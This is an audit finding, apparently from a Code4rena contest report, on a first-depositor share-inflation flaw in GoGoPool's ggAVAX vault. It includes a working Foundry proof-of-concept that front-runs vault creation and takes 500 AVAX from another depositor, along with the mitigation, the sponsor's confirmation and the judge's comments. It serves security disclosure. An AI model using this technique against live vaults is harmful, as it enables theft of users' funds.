@@ -1,0 +1,45 @@
+[H-05] Inflation of ggAVAX share price by first depositor
+Submitted by0xdeadbeef0x, also found byeierina,ak1,datapunk,0xNazgul,Qeew,Breeje,SamGMK,IllIllI,TomJ,sces60107,WatchDogs,Arbor-Finance,SmartSek,hansfriese,tonisives,peanuts,unforgiven,0xSmartContract,fs0c,ck,0xbepresent,yongskiws,0xLad,btk,rvierdiiev,koxuan,ladboy233,Rolezn,HE1M,yongskiws,SEVEN, anddic0de
+Inflation ofggAVAXshare price can be done by depositing as soon as the vault is created.
+Impact:
+Early depositor will be able steal other depositors fundsExchange rate is inflated. As a result depositors are not able to deposit small funds.
+Proof of Concept
+IfggAVAXis not seeded as soon as it is created, a malicious depositor can deposit 1 WEI of AVAX to receive 1 share.The depositor can donate WAVAX to the vault and callsyncRewards. This will start inflating the price.
+When the attacker front-runs the creation of the vault, the attacker:
+CallsdepositAVAXto receive 1 shareTransfersWAVAXtoggAVAXCallssyncRewardsto inflate exchange rate
+The issue exists because the exchange rate is calculated as the ratio between thetotalSupplyof shares and thetotalAssets().When the attacker transfersWAVAXand callssyncRewards(), thetotalAssets()increases gradually and therefore the exchange rate also increases.
+convertToShares:https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/upgradeable/ERC4626Upgradeable.sol#L123
+function convertToShares(uint256 assets) public view virtual returns (uint256) {uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.return supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());}
+Its important to note that while it is true that cycle length is 14 days, in practice time between cycles can very between 0-14 days.
+This is because syncRewards validates that the next reward cycle is evenly divided by the length (14 days).
+syncRewards:https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L102
+function syncRewards() public {----------// Ensure nextRewardsCycleEnd will be evenly divisible by `rewardsCycleLength`.uint32 nextRewardsCycleEnd = ((timestamp + rewardsCycleLength) / rewardsCycleLength) * rewardsCycleLength;---------}
+Therefore:
+The closer the call tosyncRewardsis to the next evenly divisible value ofrewardsCycleLength, the closer the nextrewardsCycleEndwill be.The closer the delta betweensyncRewardscalls is, the higher revenue the attacker will get.
+Edge case example:syncRewardsis called with the timestamp 1672876799,syncRewardswill be able to be called again 1 second later.(1672876799 + 14 days) / 14 days) * 14 days) = 1672876800
+Additionally, the price inflation causes a revert for users who want to deposit less then the donation (WAVAX transfer) amount, due to precision rounding when depositing.
+depositAVAX:https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L166
+function depositAVAX() public payable returns (uint256 shares) {------if ((shares = previewDeposit(assets)) == 0) {revert ZeroShares();}------}
+previewDepositandconvertToShares:https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/upgradeable/ERC4626Upgradeable.sol#L133https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/upgradeable/ERC4626Upgradeable.sol#L123
+function convertToShares(uint256 assets) public view virtual returns (uint256) {uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.return supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());}function previewDeposit(uint256 assets) public view virtual returns (uint256) {return convertToShares(assets);}
+Foundry POC
+The POC will demonstrate the below scenario:
+Bob front-runs the vault creation.Bob deposits 1 WEI of AVAX to the vault.Bob transfers 1000 WAVAX to the vault.Bob callssyncRewardswhen block.timestamp =1672876799.Bob waits 1 second.Bob callssyncRewardsagain. Share price fully inflated.Alice deposits 2000 AVAX to vault.Bob withdraws 1500 AVAX (steals 500 AVAX from Alice).Alice share earns her 1500 AVAX (although she deposited 2000).
+Additionally, the POC will show that depositors trying to deposit less then the donation amount will revert.
+Add the following test toTokenggAVAX.t.sol:https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/test/unit/TokenggAVAX.t.sol#L108
+function testShareInflation() public {uint256 depositAmount = 1;uint256 aliceDeposit = 2000 ether;uint256 donationAmount = 1000 ether;vm.deal(bob, donationAmount  + depositAmount);vm.deal(alice, aliceDeposit);vm.warp(1672876799);// create new ggAVAXggAVAXImpl = new TokenggAVAX();ggAVAX = TokenggAVAX(deployProxy(address(ggAVAXImpl), address(guardian)));ggAVAX.initialize(store, ERC20(address(wavax)));// Bob deposits 1 WEI of AVAXvm.prank(bob);ggAVAX.depositAVAX{value: depositAmount}();// Bob transfers 1000 AVAX to vaultvm.startPrank(bob);wavax.deposit{value: donationAmount}();wavax.transfer(address(ggAVAX), donationAmount);vm.stopPrank();// Bob Syncs rewardsggAVAX.syncRewards();// 1 second has passed// This can range between 0-14 days. Every seconds, exchange rate risesskip(1 seconds);// Alice deposits 2000 AVAXvm.prank(alice);ggAVAX.depositAVAX{value: aliceDeposit}();//Expectet revert when any depositor deposits less then 1000 AVAXvm.expectRevert(bytes4(keccak256("ZeroShares()")));ggAVAX.depositAVAX{value: 10 ether}();// Bob withdraws maximum assests for his shareuint256 maxWithdrawAssets = ggAVAX.maxWithdraw(bob);vm.prank(bob);ggAVAX.withdrawAVAX(maxWithdrawAssets);//Validate bob has withdrawn 1500 AVAXassertEq(bob.balance, 1500 ether);// Alice withdraws maximum assests for her sharemaxWithdrawAssets = ggAVAX.maxWithdraw(alice);ggAVAX.syncRewards(); // to update accountingvm.prank(alice);ggAVAX.withdrawAVAX(maxWithdrawAssets);// Validate that Alice withdraw 1500 AVAX + 1 (~500 AVAX loss)assertEq(alice.balance, 1500 ether + 1);}
+To run the POC, execute:
+forge test -m testShareInflation -v
+Expected output:
+Running 1 test for test/unit/TokenggAVAX.t.sol:TokenggAVAXTest[PASS] testShareInflation() (gas: 3874399)Test result: ok. 1 passed; 0 failed; finished in 8.71s
+Tools Used
+VS Code, Foundry
+Recommended Mitigation Steps
+When creating the vault add initial funds in order to make it harder to inflate the price.
+Best practice would add initial funds as part of the initialization of the contract (to prevent front-running).
+emersoncloud (GoGoPool) confirmed
+Alex the Entreprenerd (judge) commented:
+The Warden has shown how, by performing a small deposit, followed by a transfer, shares can be rebased, causing a grief in the best case, and complete fund loss in the worst case for every subsequent depositor.While the finding is fairly known, it’s impact should not be understated, and because of this I agree with High Severity.I recommend watching this presentation by Riley Holterhus which shows possible mitigations for the attack:https://youtu.be/_pO2jDgL0XE?t=601
+emersoncloud (GoGoPool) mitigated:
+Initialize ggAVAX with a deposit:multisig-labs/gogopool#49
+Status:Mitigation confirmed byRaymondFamandhansfriese.
